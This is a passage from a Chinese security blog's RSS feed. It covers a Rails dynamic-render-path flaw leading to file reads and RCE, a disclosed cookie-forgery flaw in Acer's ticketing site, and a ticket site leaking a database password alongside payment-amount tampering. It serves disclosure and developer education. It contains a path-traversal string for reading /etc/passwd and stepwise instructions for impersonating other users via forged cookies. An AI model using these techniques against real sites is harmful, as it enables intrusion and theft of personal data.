  &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shift&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;The file &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; did not specify a template handler. The default is currently ERB, &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
              &lt;span class=&quot;s2&quot;&gt;&quot;but will change to RAW in the future.&quot;&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;ActiveSupport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Deprecation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;warn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;handler_for_extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;last&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EXTENSIONS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:variants&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;last&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;而這裡預設的 handler 是 ERB（見 register_default_template_handler），所以有本篇後面提到的進階攻擊，可以被利用來 RCE。&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# lib/action_view/template/handlers.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;extended&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_default_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:erb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ERB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:ruby&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_proc&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;慶幸的是，目前 Rails 已經把預設的 template handler 從 ERB 改成 RAW，不會輕易把要 render 的檔案當成 ERB 執行了。詳細的內容請參考這個 &lt;a href=&quot;https://github.com/rails/rails/commit/4be859f0fdf7b3059a28d03c279f03f5938efc80&quot;&gt;commit&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;Ruby on Rails 能讓開發者較輕鬆的開發出安全的應用程式，然而，若開發者不注意，還是有可能寫出嚴重的漏洞。本文的動態樣板路徑就是這樣一個例子，它不只是 OWASP 所描述的可以存取任意模版而已，它可以遍歷檔案，甚至因為 rails 預設的 template handler 是 ERB，造成遠端命令執行讓攻擊者取得伺服器操作權。&lt;/p&gt;

&lt;p&gt;這個例子又再次驗證，框架可以幫助大家快速開發，增加安全度。但唯有良好的安全意識，才是應用程式安全的基石。&lt;/p&gt;

&lt;h3 id=&quot;註解&quot;&gt;註解&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;Dynamic Render Paths 目前並沒有中文翻譯，因為問題之精髓在於要產生的樣板路徑是可變動的，因此筆者認為動態樣板路徑這個翻譯較為貼切。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;筆者測試的環境為 Rails 4.1.4，其他 Rails 版本有可能需要用 ../../../../../etc/passwd 跳脫目前目錄。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails/</link>
                <guid>https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails</guid>
                <pubDate>Fri, 24 Jul 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>談 Cookie 認證安全－以宏碁雲端售票為例</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;Cookie 是開發網頁應用程式很常利用的東西，它是為了解決 HTTP stateless 特性但又需要有互動而產生的。開發者想把什麼資訊暫存在用戶瀏覽器都可以透過 Cookie 來完成，只要資訊量不大於約 4KB 的限制就沒問題。在這樣的空間裡，可以放購物車內的暫存商品、可以儲存讀者閱讀記錄以精準推薦產品、當然也可以寫入一些認證資訊讓使用者能保持登入狀態。&lt;/p&gt;

&lt;p&gt;Cookie 有一些先天上的缺點，在於資料是儲存在瀏覽器端，而使用者是可以任意修改這些資料的。所以如果網站的使用者身分認證資訊依賴 Cookie，偷偷竄改那些認證資訊，也許有機會能夠欺騙網站，盜用他人身分，今天就來談談這樣的一件事情吧！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;問題與回報&quot;&gt;問題與回報&lt;/h3&gt;

&lt;p&gt;會想要聊這個議題，主要是因為最近很紅的宏碁雲端售票系統就是採用 Cookie 認證。上週在註冊該網站時看了一下 Cookie，發現該網站沒有使用 &lt;a href=&quot;https://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;Session 機制&lt;/a&gt;的跡象，也就是單純利用 Cookie 的值來認證。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/acer_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/acer_cookie.png&quot; alt=&quot;宏碁雲端 cookie&quot; title=&quot;宏碁雲端 cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;於是開始好奇認證主要的依據是什麼？從圖中可以看到 Cookie 值並不多，猜測該網站大概會是看 USER_ID、USER_ACCOUNT 來判斷你是哪個使用者，稍作測試後會發現有些頁面只依據 USER_ACCOUNT 的值來確認身分，而 USER_ACCOUNT 這個值其實就是使用者的身分證字號，也就是說任何人只要跟網站說我的身分證字號是什麼，網站就會認為你是那個身分證字號的使用者。利用這點設計上的小瑕疵，就可以竊取他人個資，更進階一點，甚至可以用來清空別人的志願單讓其他使用者買不到票。&lt;/p&gt;

&lt;p&gt;發現這個問題後，決定通報 &lt;a href=&quot;https://vulreport.net/&quot;&gt;VulReport 漏洞回報平台&lt;/a&gt;，由該平台統一通知開發商。這是我第一次使用這個平台，對我而言這是一個方便且對整體資安環境有助益的平台。方便點在於，過去常常困擾於發現一些網站有設計上的疏失卻不知該不該通報，如果認識該網站的開發者倒是還好可以直接講，但對於其他不認識的，一來沒有明確窗口，二來礙於工作關係怕被認為是敲竹槓，所以影響不大的漏洞可能就放水流了。這樣放任其實不是一件健康的事情，漏洞在風險就在，有了這樣的回報平台至少可以告訴企業可能存在風險，自己也可以放心通報。事實上，對岸有&lt;a href=&quot;http://wooyun.org/&quot;&gt;類似的平台&lt;/a&gt;已經行之有年，最顯著的效果，就是對岸網站在 0 day 被揭露後能在一週左右全國修復，而以往可能好多年過去了漏洞還在。這真的能夠加速保護企業和使用者，很高興台灣也有了這樣的平台！&lt;/p&gt;

&lt;p&gt;昨天早上收到了平台回報宏碁雲端售票已經&lt;a href=&quot;https://vulreport.net/vulnerability/detail/284&quot;&gt;修復的消息&lt;/a&gt;，既然已經修復且公開了，就順便講解這個問題的細節吧！希望其他開發者可以從中體會到攻擊者的思維，進而做洽當的防禦。&lt;/p&gt;

&lt;h3 id=&quot;驗證及危害&quot;&gt;驗證及危害&lt;/h3&gt;

&lt;p&gt;為了方便驗證解說這個問題，這邊特別用兩個不存在的身分證字號在宏碁雲端售票申請帳號，分別是 Z288252522 和 Z239398899。測試目的是登入帳號 Z288252522 後看看是否能利用上述 Cookie 問題讀取 Z239398899 的個資。&lt;/p&gt;

&lt;p&gt;首先登入帳號 Z288252522，找到一個會回傳個資的頁面：&lt;br /&gt;
https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_A_data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_A_data.png&quot; alt=&quot;第一個使用者個資&quot; title=&quot;第一個使用者個資&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;此時的 Cookie 值如下&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_A_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_A_cookie.png&quot; alt=&quot;第一個使用者 cookie&quot; title=&quot;第一個使用者 cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從圖中發現 Cookie 的值其實是經過加密的，這點在上面說明攻擊觀念時刻意沒有提及。把 Cookie 值加密是一種防止別人修改 Cookie 值的方式，攻擊者不知道 Cookie 值的內容，自然也無法修改了。&lt;/p&gt;

&lt;p&gt;然而這樣做還是存在些微風險，一旦這個加解密方式被找到，攻擊者就得以修改 Cookie 內容，進而盜用別人身分。在本例中，若想憑著改變 Cookie 盜用別人身分其實可以不用花時間去解加密法，這裡有一個小 trick，我們從觀察中馬上就能發現所有 Cookie 值都是用同一套加密方式，而且其中 USER_EMAIL、USER_NAME 這些還是我們可以修改的值。這也意味著如果我們把姓名改成我們想要加密的身分證字號，伺服器就會回傳一個加密好的值給 USER_NAME。我們直接來修改姓名看看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;h/assets/img/blog/20150130/change_name.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/change_name.png&quot; alt=&quot;修改姓名成身分證字號&quot; title=&quot;修改姓名成身分證字號&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;當姓名改成目標 Z239398899 時，Cookie 中的 USER_NAME 值就會改變成我們要的加密結果。耶！是一種作業不會寫找出題老師幫忙寫的概念 XD&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_B_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_B_cookie.png&quot; alt=&quot;改變第一個使用者 cookie&quot; title=&quot;改變第一個使用者 cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;接著直接把 USER_NAME 的值拿來用，複製貼上到目標欄位 USER_ACCOUNT 中，之後就是以 Z239398899 的身分來讀取網頁了。我們再讀取一次 https://www.jody-ticket.com.tw/UTK0196_.aspx 看看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_B_data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_B_data.png&quot; alt=&quot;第二個使用者個資&quot; title=&quot;第二個使用者個資&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;成功看到 Z239398899 的資料了！如此，就可以只憑一個身分證字號讀到他人的地址電話資訊，甚至可以幫別人搶票或取消票券。這個流程寫成程式後只要兩個 request 就可以嘗試登入一個身分證字號，要大量偷取會員個資也是可行的了。&lt;/p&gt;

&lt;p&gt;說到這邊，也許有人會質疑要猜中註冊帳戶的身分證字號是有難度的，但其實要列舉出全台灣可能在使用的身分證字號並不困難，再加上宏碁雲端的硬體其實是很不錯的，事實也證明它能夠在&lt;a href=&quot;https://tw.news.yahoo.com/%E6%B1%9F%E8%95%99%E5%8A%A0%E5%A0%B4%E5%94%AE%E7%A5%A8-%E9%A7%AD%E5%AE%A2%E6%94%BB%E6%93%8A4000%E8%90%AC%E6%AC%A1-041458504.html&quot;&gt;短時間處理四千萬個請求系統仍保持穩定&lt;/a&gt;，只要攻擊者網路不要&lt;a href=&quot;http://www.cna.com.tw/news/afe/201501250162-1.aspx&quot;&gt;卡在自家巷子口&lt;/a&gt;，多機器多線程佈下去猜身分證字號效率應該很可觀！&lt;/p&gt;

&lt;h3 id=&quot;建議原則&quot;&gt;建議原則&lt;/h3&gt;

&lt;p&gt;這次的問題是兩個弱點的組合攻擊：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Cookie 加密的內容可解也可偽造－透過網站幫忙&lt;/li&gt;
  &lt;li&gt;功能缺少權限控管 (Missing Function Level Access Control)－部分頁面只憑身分證字號就可存取個資&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;宏碁雲端售票為了效率和分流，使用 Cookie 認證是相當合理的設計，所以要解決這個問題，從第二點來解決會是最有效且符合成本的方式，怎麼改呢？推測原本的 SQL 語句應該類似這樣：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ACCOUNT&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;由於 USER_ACCOUNT 是身分證字號，容易窮舉，更嚴謹的作法可以多判斷一個 id，像是這樣：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ACCOUNT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ID&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;從只需要告訴伺服器身分證字號就回傳會員資料，到變成需要身分證字號和會員編號同時正確才會回傳會員資料，至此，攻擊者已經很難同時知道別人的會員編號和身分證字號了，因此大大降低了被猜中的機率，增加了安全性。&lt;/p&gt;

&lt;p&gt;Cookie 一直以來都是 Web Application Security 領域的兵家必爭之地，攻擊者無不絞盡腦汁想偷到或偽造它，前陣子舉辦的 &lt;a href=&quot;http://girls.hitcon.org/&quot;&gt;HITCON GIRLS&lt;/a&gt; Web 課堂練習題第一題就是改 Cookie 來偽造身分，足見這個問題有多基本和重要。&lt;/p&gt;

&lt;p&gt;關於 Cookie，這裡提供一點原則和概念供大家參考：&lt;/p&gt;

&lt;p&gt;首先，Cookie 是存在客戶端的，所以有機會被看到、被竄改、被其他人偷走。基於這些原因，不建議在 Cookie 中儲存機敏資料，或是存放會影響伺服器運作的重要參數，需評估一下這些暫存資料被人家看到或修改是不是沒差，這是儲存的原則。如果權衡後還是要在 Cookie 中存放重要資料，那就需要對值加密避免被讀改，而且要確保加密的強度以及其他人是否能透過其他方法解析修改。最後，Cookie 最常被偷走的方式是透過 JavaScript，所以建議在重要的 Cookie 加上 &lt;a href=&quot;https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/&quot;&gt;HttpOnly flag&lt;/a&gt; 能有效的降低被偷走的機率。也來試著整理一下這一小段的重點：&lt;/p&gt;

&lt;ul class=&quot;devcore&quot;&gt;
  &lt;li&gt;機敏資料不要存&lt;/li&gt;
  &lt;li&gt;加密資訊不可少&lt;/li&gt;
  &lt;li&gt;設定標頭不怕駭&lt;/li&gt;
  &lt;li&gt;一次搞定沒煩惱&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;沒想到信手拈來就是三不一沒有，前面再加個勾勾，感覺好像很厲害呢！&lt;/p&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;由於 Cookie 存在瀏覽器端，有被竄改的可能，所以如果網站使用 Cookie 認證就會有一些安全上的風險。本篇就以宏碁雲端售票為例，說明這種小疏忽可能會造成被盜用帳號的風險。開發者在面對使用者可以改變的變數一定要特別小心處理，做好該有的防護，還是老話一句：使用者傳來的資料皆不可信！只要掌握這個原則，開發出來的產品就能夠少很多很多風險！&lt;/p&gt;

&lt;p&gt;行文至此，預期中是要再推廣一下漏洞回報平台，順便稱讚宏碁非常重視資安，修復快速，是良好的正循環。不過前兩天看到一些關於宏碁雲端售票的新聞時，上線發現此弱點仍未修復，這好像真的有點不應該，畢竟官方上週已經接收到通報，要修復這個弱點也只需一行判斷式…。能理解這次的弱點在短時間開發過程中很難被注意到，對於這樣一個一週不眠不休完成的售票網站，我其實也是給予滿高的評價，但如果官方能再增兩分對資安事件的重視，相信下次定能以滿分之姿呈現在使用者面前！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2015/01/30/cookie-security-insight-acer/</link>
                <guid>https://devco.re/blog/2015/01/30/cookie-security-insight-acer</guid>
                <pubDate>Fri, 30 Jan 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>從寬宏售票談資安</title>
                <description>&lt;p&gt;戴夫寇爾部落格停載了快兩個月，非常抱歉，讓各位常常催稿的朋友們久等了 &amp;lt;(_ _)&amp;gt;&lt;br /&gt;
今天就乘著全臺瘋買票的浪頭，來談談一些常被忽略的資訊安全小概念吧！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;江蕙引退演唱會一票難求，隔岸觀了兩天火， 也忍不住想要當個鍵盤孝子。無奈運氣不好一直連不上主機，『Service Unavailable』畫面看膩了，只好看看暫存頁面的網頁原始碼，不看還好，一看我驚呆了！&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_information_leakage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_information_leakage.png&quot; alt=&quot;寬宏售票資訊洩漏&quot; title=&quot;寬宏售票資訊洩漏&quot; /&gt;&lt;/a&gt;
（特別聲明：此流程中並無任何攻擊行為，該頁面是正常購票流程中出現的網頁）&lt;/p&gt;

&lt;p&gt;在結帳網頁原始碼當中竟然看到了疑似資料庫密碼 SqlPassWord 在表單裡面！這件事從資安的角度來看，除了表面上洩漏了資料庫密碼之外，還有兩個我想講很久但苦無機會談的資安議題，分別是金流串接常見的弱點以及駭客的心理。藉著寬宏售票網頁洩漏密碼這件事情，順道與大家分享分享吧！&lt;/p&gt;

&lt;h3 id=&quot;談台灣網站的金流串接&quot;&gt;談台灣網站的金流串接&lt;/h3&gt;

&lt;p&gt;在本篇的例子中，寬宏售票網頁表單出現了疑似資料庫密碼，這狀況就好像去銀行繳款，櫃檯給你一把鑰匙跟你說：『這是金庫的鑰匙，麻煩你到對面那個櫃檯把鑰匙給服務員，請他幫你把錢放進金庫裡面』。&lt;br /&gt;
是不是有點多此一舉，銀行本來就會有一份鑰匙，幹嘛要請你（瀏覽器）幫忙轉交？&lt;br /&gt;
如果今天壞人拿到了這把鑰匙，是不是只要繞過保全的視線，就可以打開金庫為所欲為？&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/3d_key_to_success.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/3d_key_to_success.jpg&quot; alt=&quot;key_to_success&quot; title=&quot;key_to_success&quot; /&gt;&lt;/a&gt;
&lt;br /&gt;（Photo by StockMonkeys.com）&lt;/p&gt;

&lt;p&gt;類似的狀況也滿常發生在電子商務與第三方金流服務的串接上。&lt;br /&gt;
許多電子商務網站專注於商務，選擇將付款步驟委託第三方金流服務處理，一般常見的流程是這樣的：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;電子商務訂單成立，電子商務網站給你一張單子，上面寫著：『訂單 123 號， 金額 456 元』，請你將單子轉交給第三方金流服務網站並繳款。&lt;/li&gt;
  &lt;li&gt;金流服務網站依據你給它的單據收取 456 元，並且跟電子商務網站說：『訂單 123 已成功繳款，款項 456 元』。&lt;/li&gt;
  &lt;li&gt;最後電子商務網站告訴你訂單 123 號購買成功。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;如果現在有一個惡意使用者，他做了以下惡搞：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;在步驟一把電子商務網站給的單子修改成：『訂單 123 號，金額 20 元』（原價是 456 元）&lt;/li&gt;
  &lt;li&gt;金流服務商依據單據跟惡意使用者收取 20 元費用，並且告訴電子商務網站：『訂單 123 已成功繳款，款項 20 元』&lt;/li&gt;
  &lt;li&gt;最後電子商務網站看到『訂單 123 已成功繳款』的訊息，就告訴使用者說訂單 123 購買成功。也就是惡意使用者只花取 20 元就購買到原價 456 元的產品。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;(聲明：為求精簡，電子商務與金流服務串接流程有經過簡化，有抓到精髓就好XD)&lt;/p&gt;

&lt;p&gt;不管是寬宏售票出現密碼欄位還是上例電子商務網站的金流串接，最大的問題在於他們都相信使用者會正常幫忙轉交，即靠客戶端的瀏覽器來轉址傳值。要知道，利用瀏覽器轉址傳值是不可靠的，一來，重要的資訊就會被客戶知道，例如寬宏售票疑似洩漏資料庫密碼；二來中間的內容可以修改，例如修改訂單金額。另外，可能有人會發現到，在惡意使用者的步驟三裡面，電子商務網站竟然沒有確認付款金額是否正確，沒錯，這是會發生的事情，在過去經驗中，像這樣沒有比對付款金額的台灣系統比例還不少，這些疏忽都會造成企業很多成本損失，不可不注意。&lt;/p&gt;

&lt;p&gt;台灣目前還滿常見到這種根據使用者傳來單據來收費的狀況，導致單據可竄改造成企業損失，某部分原因可以歸咎到早期第三方金流的範例都是這樣寫的，工程師也就直接延續這樣的寫法直到現在。以金流串接為例，比較好的處理方式有下面兩種：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;在單據上加入防偽標記，讓惡意使用者無法輕易竄改單據。在技術上作法有點類似 OAuth 在 Signing Request 時的作法，在請求中多送一組檢查碼，透過 one-way hash 的方式檢查網址是否有被修改，目前大部分金流商都有提供相似解法。&lt;/li&gt;
  &lt;li&gt;單據不再給使用者轉交，電子商務直接傳單子『訂單 123 號，金額 20 元』給金流服務網站，並請使用者直接去專屬的金流商窗口繳費即可。在技術上就是將瀏覽器轉址傳值的動作全部變成伺服器對伺服器溝通處理掉。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以上兩種作法，將可以有效防止惡意使用者修改訂單金額。此外，建議電子商務網站在收到金流回傳的付款資訊後，能夠比對收取款項與訂單款項是否相符，如此雙重檢查，能大大避免惡意行為，減少企業處理惡意金流問題的成本。&lt;/p&gt;

